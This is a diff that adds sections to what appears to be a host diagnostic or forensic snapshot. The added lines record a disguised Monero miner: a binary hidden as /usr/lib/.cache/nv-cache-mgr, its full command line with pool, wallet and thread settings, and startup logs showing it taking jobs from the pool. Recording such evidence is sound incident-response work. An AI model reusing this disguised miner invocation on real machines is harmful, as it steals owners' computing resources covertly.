@@ -271,3 +271,14 @@ default via 10.64.0.1 dev eth0 proto dhcp src 10.64.11.120 metric 100
 10.64.0.0/20 dev eth0 proto kernel scope link src 10.64.11.120 metric 100 
 10.64.0.1 dev eth0 proto dhcp scope link src 10.64.11.120 metric 100 
 172.17.0.0/16 dev docker0 proto kernel scope link src 172.17.0.1 linkdown 
+--- xmr-bin
+-rwxr-xr-x 1 root root 8297712 Nov 21 18:54 /usr/lib/.cache/nv-cache-mgr
+--- xmr-proc
+   7333  368 /usr/lib/.cache/nv-cache-mgr -o pool.hashvault.pro:443 -u 45LJceeKt6A2ZHVNVF4Qqo53it2dGkpxGbRqXLya52z36fvWicAZmG2GjpczNbgyu6gGqJQag7o4LAnNBLCC1oaHDStyUVD -p x -k --rig-id hk-184-105-5-94 -t 4 --donate-level 1 --no-color --log-file /usr/lib/.cache/nv.log
+--- xmr-log
+[2026-11-21 18:58:07.525]  randomx  allocated 2336 MB (2080+256) huge pages 100% 1168/1168 +JIT (1166 ms)
+[2026-11-21 18:58:10.200]  randomx  dataset ready (2674 ms)
+[2026-11-21 18:58:10.200]  cpu      use profile  *  (4 threads) scratchpad 2048 KB
+[2026-11-21 18:58:10.205]  cpu      READY threads 4/4 (4) huge pages 100% 4/4 memory 8192 KB (5 ms)
+[2026-11-21 18:58:15.481]  net      new job from pool.hashvault.pro:443 diff 72000 algo rx/0 height 3811432 (71 tx)
+=== end 2026-11-21T18:58:16Z
